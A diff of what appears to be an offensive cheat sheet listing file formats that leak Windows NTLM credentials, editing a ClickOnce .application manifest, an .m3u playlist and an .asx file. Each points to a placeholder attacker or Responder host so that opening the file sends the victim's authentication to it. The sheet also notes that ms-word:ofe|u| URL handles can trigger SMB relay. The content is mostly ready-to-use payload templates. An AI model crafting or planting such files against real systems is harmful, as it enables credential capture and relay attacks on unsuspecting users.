@@ -33,6 +33,8 @@ Using a URL handle with `ms-word:ofe|u|` scheme can trigger SMB relay.
 
 ## 03 - ClickOnce
 
+TODO: check `.manifest` and `.appref-ms` to reproduce it.
+
 Name it with `.application` extension.
 
 ```xml
@@ -42,8 +44,8 @@ Name it with `.application` extension.
 	<description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
 	<deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
 	<dependency>
-		<dependentAssembly dependencyType="install" codebase="file://<responder ip>/leak/Leak.exe.manifest" size="32909">
-			<assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
+		<dependentAssembly dependencyType="install" codebase="file://<responder ip>/snare/Program.exe.manifest" size="32909">
+			<assemblyIdentity name="Program.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
 			<hash>
 				<dsig:Transforms>
 					<dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
@@ -104,8 +106,8 @@ Name it with `.m3u` extension.
 
 ```
 #EXTM3U
-#EXTINF:1337, Leak
-\\<responder ip>\leak.mp3
+#EXTINF:1337, Snare
+\\<attacker_IP>\file.mp3
 ```
 
 Name it with `.asx` extension.
@@ -115,7 +117,7 @@ Name it with `.asx` extension.
 	<title>Leak</title>
 	<entry>
 		<title></title>
-		<ref href="file://<responder ip>/leak/leak.wma"/>
+		<ref href="file://<attacker_IP>/snare/file.wma"/>
 	</entry>
 </asx>
 ```
